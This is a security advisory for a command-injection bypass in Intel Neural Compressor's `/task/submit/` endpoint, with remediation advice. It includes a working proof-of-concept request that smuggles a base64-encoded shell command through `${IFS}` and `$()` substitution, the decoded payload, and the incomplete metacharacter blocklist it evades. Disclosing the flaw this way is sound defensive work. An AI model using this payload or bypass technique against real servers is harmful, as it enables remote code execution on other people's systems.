# Remote Code Execution via Insufficient `script_url` Sanitization in Intel Neural Compressor [intel/neural-compressor](https://github.com/intel/neural-compressor)

---
 
## Metadata
 
| Field | Details |
|---|---|
| **Affected Software** | Intel Neural Compressor v3.7 (latest) |
| **Vendor** | Intel Corporation |
| **Repository** | [intel/neural-compressor](https://github.com/intel/neural-compressor) |
| **Vulnerability Type** | Remote Code Execution (RCE) - Command Injection |
| **Severity** | Critical |
| **Attack Vector** | Network (unauthenticated remote) |
| **Bypasses** | Prior sanitization controls on `/task/submit/` endpoint |
 
---

## Executive Summary
 
A command injection vulnerability exists in the `script_url` input field of Intel Neural Compressor's `/task/submit/` API endpoint. While a prior fix introduced a character-level blocklist to filter dangerous input, the implementation is incomplete — it fails to block shell substitution syntax (`${}` and `$()`). An attacker can exploit this gap to embed and execute arbitrary shell commands on the server, effectively bypassing the existing sanitization control and achieving full Remote Code Execution (RCE).
 
---


## Technical Description
 
### Entry Point
 
The vulnerability is triggered through the `/task/submit/` POST endpoint defined in `./frontend/fastapi/main_server.py`. The endpoint accepts a JSON body containing a `Task` object, where the `script_url` field is attacker-controlled.

```python
@app.post("/task/submit/")
async def submit_task(task: Task):
    """Submit task.

    Args:
        task (Task): _description_
        Fields:
            task_id: The task id
            arguments: The task command
            workers: The requested resource unit number
            status: The status of the task: pending/running/done
            result: The result of the task, which is only value-assigned when the task is done

    Returns:
        json: status , id of task and messages.
    """
    if not is_valid_task(task.dict()):
        raise HTTPException(status_code=422, detail="Invalid task")

    msg = "Task submitted successfully"
    status = "successfully"
    # search the current
    db_path = get_db_path(config.workspace)

    if os.path.isfile(db_path):
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        task_id = str(uuid.uuid4()).replace("-", "")
        sql = (
            r"insert into task(id, script_url, optimized, arguments, approach, requirements, workers, status)"
            + r" values ('{}', '{}', {}, '{}', '{}', '{}', {}, 'pending')".format(
                task_id,
                task.script_url,
                task.optimized,
                list_to_string(task.arguments),
                task.approach,
                list_to_string(task.requirements),
                task.workers,
            )
        )
        cursor.execute(sql)
        conn.commit()
        try:
            task_submitter.submit_task(task_id)
        except ConnectionRefusedError:
            msg = "Task Submitted fail! Make sure Neural Solution runner is running!"
            status = "failed"
        except Exception as e:
            msg = "Task Submitted fail! {}".format(e)
            status = "failed"
        conn.close()
    else:
        msg = "Task Submitted fail! db not found!"
        return {"msg": msg}  # TODO to align with return message when submit task successfully
    return {"status": status, "task_id": task_id, "msg": msg}

```
---

### Sanitization Analysis
 
#### Layer 1 - `is_valid_task()`
 
The top-level validation function (`./neural_solution/frontend/utility.py`) delegates `script_url` validation to `is_invalid_str()`:


```python
def is_valid_task(task: dict) -> bool:
    """Verify whether the task is valid.

    Args:
        task (dict): task request

    Returns:
        bool: valid or invalid
    """
    required_fields = ["script_url", "optimized", "arguments", "approach", "requirements", "workers"]

    for field in required_fields:
        if field not in task:
            return False

    if not isinstance(task["script_url"], str) or is_invalid_str(task["script_url"]):
        return False

    if (isinstance(task["optimized"], str) and task["optimized"] not in ["True", "False"]) or (
        not isinstance(task["optimized"], str) and not isinstance(task["optimized"], bool)
    ):
        return False

    if not isinstance(task["arguments"], list):
        return False
    else:
        for argument in task["arguments"]:
            if is_invalid_str(argument):
                return False

    if not isinstance(task["approach"], str) or task["approach"] not in ["static", "static_ipex", "dynamic", "auto"]:
        return False

    if not isinstance(task["requirements"], list):
        return False
    else:
        for requirement in task["requirements"]:
            if is_invalid_str(requirement):
                return False

    if not isinstance(task["workers"], int) or task["workers"] < 1:
        return False

    return True
```
---

#### Layer 2 - `is_invalid_str()` *(Insufficient)*
 
This function applies a character level blocklist to reject strings containing specific shell metacharacters:

```python
def is_invalid_str(to_test_str: str):
    """Verify whether the to_test_str is valid.

    Args:
        to_test_str (str): string to be tested.

    Returns:
        bool: valid or invalid
    """
    return any(char in to_test_str for char in [" ", '"', "'", "&", "|", ";", "`", ">"])
```

**The blocklist is incomplete.** It explicitly filters spaces, quotes, and common shell operators, but does **not** block the following characters that enable shell command substitution:
 
| Character | Shell Meaning | Blocked? |
|---|---|---|
| `$` | Variable/substitution prefix | ❌ No |
| `{` | Brace expansion | ❌ No |
| `}` | Brace expansion | ❌ No |
| `(` | Subshell / process substitution | ❌ No |
| `)` | Subshell / process substitution | ❌ No |
 
This allows an attacker to craft a URL containing `${}` (brace expansion for IFS based space bypass) and `$()` (command substitution), which the shell will interpret and execute when the URL is processed downstream.
 
---

### Bypass Technique
 
The attacker avoids blocked characters (spaces, quotes, etc.) by leveraging:
 
- **`${IFS}`** — substitutes the Internal Field Separator (a space by default) without using a literal space character.
- **`$(command)`** — executes a subshell command inline.
- **`<<<` (here-string)** — passes a string to a command's stdin without using blocked characters.
- **Base64 encoding** — encodes the actual payload to avoid character restrictions entirely.
This combination allows arbitrary shell commands to be embedded within a syntactically valid URL string that passes all current validation checks.
 
---


```
POST /task/submit/ HTTP/1.1
Host: localhost:8000
User-Agent: Firefox/146.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/json
Content-Length: 280

{
    "script_url": "https://test.com/$(bash${IFS}-s${IFS}<${IFS}<(base64${IFS}-d${IFS}<<<ZWNobyAkKHdob2FtaSkgPiAvdG1wL3dob2FtaQo=))",
    "optimized": "False",
    "arguments": [
 
    ],
    "approach": "static",
    "requirements": [
"test"
    ],
    "workers": 1
}
```

This will create a task and bypass the previous CVE of this injection

## Proof of Concept
 
### Malicious Request
 
```http
POST /task/submit/ HTTP/1.1
Host: localhost:8000
Content-Type: application/json
 
{
    "script_url": "https://test.com/$(bash${IFS}-s${IFS}<${IFS}<(base64${IFS}-d${IFS}<<<ZWNobyAkKHdob2FtaSkgPiAvdG1wL3dob2FtaQo=))",
    "optimized": "False",
    "arguments": [],
    "approach": "static",
    "requirements": ["test"],
    "workers": 1
}
```
 
### Payload Breakdown
 
| Component | Decoded Meaning |
|---|---|
| `$(bash${IFS}-s${IFS}<${IFS}<(...))` | Executes a bash process reading from a here-string |
| `base64${IFS}-d${IFS}<<<ZWNoby...` | Decodes the base64 payload and pipes it to bash |
| `ZWNobyAkKHdob2FtaSkgPiAvdG1wL3dob2FtaQo=` | Base64 of: `echo $(whoami) > /tmp/whoami` |
 
### Decoded Payload
 
```bash
echo $(whoami) > /tmp/whoami
```

### Execution Flow
 
1. The crafted `script_url` is submitted to `/task/submit/`.
2. `is_valid_task()` invokes `is_invalid_str()`, which finds no blocked characters and returns `False` (i.e., the string is deemed valid).
3. The task is stored and passed to the backend scheduler.
4. The `prepare_task()` function processes the URL, which is ultimately evaluated in a shell context via `subprocess.Popen(..., shell=True)`.
5. The shell expands `$()` and `${}` syntax, executing the embedded payload on the host system.
---
 
## Root Cause
 
The root cause is an **incomplete character blocklist** in the `is_invalid_str()` function at:
 
```
./neural_solution/frontend/utility.py (line ~300)
```
 
The function relies on a denylist approach rather than an allowlist, which is inherently fragile. By definition, a denylist must anticipate every possible attack vector a standard that is practically impossible to maintain against creative shell injection techniques.


## Impact

- execute system commands through the script_url parameter and bypass the previous CVE

## Recommended Remediation
 
### Immediate Fix — Expand the Blocklist
 
As a minimum short-term measure, extend `is_invalid_str()` to include shell substitution characters:
 
```python
def is_invalid_str(to_test_str: str):
    blocked = [" ", '"', "'", "&", "|", ";", "`", ">", "$", "{", "}", "(", ")"]
    return any(char in to_test_str for char in blocked)
```

> ⚠️ **This alone is insufficient.** Denylist based approaches are inherently bypassable and should not be relied upon as a primary security control.
 
### Recommended Long-Term Remediations
 
| # | Recommendation | Priority |
|---|---|---|
| 1 | **Switch to an allowlist approach** — only permit URLs matching a strict pattern (e.g., `^https://github\.com/[a-zA-Z0-9_\-]+/[a-zA-Z0-9_\-]+/blob/[a-f0-9]+/.+\.py$`). | Critical |
| 2 | **Eliminate `shell=True`** — refactor all `subprocess.Popen` and `subprocess.check_call` invocations to use argument lists, preventing shell metacharacter interpretation entirely. | Critical |
| 3 | **Validate and verify fetched content** — perform integrity verification (e.g., cryptographic hash checks) on all downloaded scripts before execution. | High |
| 4 | **Enforce authentication and authorization** on the `/task/submit/` endpoint to limit exposure to trusted users only. | High |
| 5 | **Conduct a full audit** of all endpoints that accept user-controlled input passed to shell or subprocess contexts. | High |
 
---

## Vulnerable Code Reference
`https://github.com/intel/neural-compressor/blob/5f3f388c2d44de2ef0d8c923989a7892758684a8/neural_solution/frontend/utility.py#L300`
